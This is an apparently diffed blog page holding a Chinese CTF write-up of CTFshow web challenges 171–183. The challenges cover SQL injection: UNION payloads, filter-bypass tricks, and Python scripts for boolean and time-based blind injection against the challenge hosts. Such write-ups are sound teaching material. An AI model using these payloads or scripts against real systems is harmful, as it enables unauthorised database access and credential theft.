@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>CTFshow部分题目writeup-2 - 明月归的小站</title>
+  
+    <meta name="keywords" content="CTFshow,wirteup">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了ctfshow上web部分题目的writeup！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">CTFshow部分题目writeup-2</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/">
+      CTFshow部分题目writeup-2
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年2月17日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：926字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：5分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/" class="leancloud_visitors" data-flag-title="CTFshow部分题目writeup-2">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了ctfshow上web部分题目的writeup！</p>
+<a id="more"></a>
+
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; or 1%23</span><br></pre></td></tr></table></figure>
+
+<p>直接万能密码</p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>联合查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2.php?id&#x3D;-1&#39; union select 1,password from ctfshow_user2 where username&#x3D;&#39;flag&#39;%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>返回结果过滤了flag字样 hex编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3.php?id&#x3D;-1&#39; union select 1,2,hex(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p>返回结果过滤了flag和数字 盲注 或者进行替换 感觉还是盲注方便</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4.php?id=-1&#x27; union <span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span>,<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">password</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;~&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;!&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;@&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;=&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;$&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;%&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;^&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>),<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> ctfshow_user4 <span class="keyword">where</span> username=<span class="string">&#x27;flag&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>再替换回来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="string">&#x27;~$%%%~^%-~%&lt;e-$~&lt;f-&lt;cc=-&lt;@@d^@=eda@e&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;3&#x27;</span>),<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;4&#x27;</span>),<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;5&#x27;</span>),<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;6&#x27;</span>),<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;7&#x27;</span>),<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;8&#x27;</span>),<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>bool盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://41f0fa36-920b-4c51-8164-c4285adadf19.chall.ctf.show/api/v4.php?id=1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user4 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user4 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;username&quot;:&quot;admin&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;username&quot;:&quot;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>返回结果过滤了<code>\x00-\x7f</code>  直接盲注吧 bool盲注也不行了 换时间盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://40dd5eb6-18de-48c2-bb1e-db759aa222bd.chall.ctf.show/api/v5.php?id=1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.get(url+p1,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url+p2,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; or 1%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>过滤空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤空格 过滤/**/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;%09or%091%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>过滤%09</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;or(1)%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>注释符号过滤了 指定id绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<p>联合查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>sql</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select count(pass) from &quot;</span>.$_POST[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1e1b7dde-8bd4-4a70-9517-4b8b96427db3.chall.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/>http://www.moonback.xyz/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-17T22:03:33+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年2月17日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTFshow/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTFshow</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wirteup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wirteup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/&title=CTFshow部分题目writeup-2 - 明月归的小站&summary=本篇博客主要介绍了ctfshow上web部分题目的writeup！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/02/17/%E5%88%B7%E9%A2%98/ctfshow/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/&title=CTFshow部分题目writeup-2 - 明月归的小站&summary=本篇博客主要介绍了ctfshow上web部分题目的writeup！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
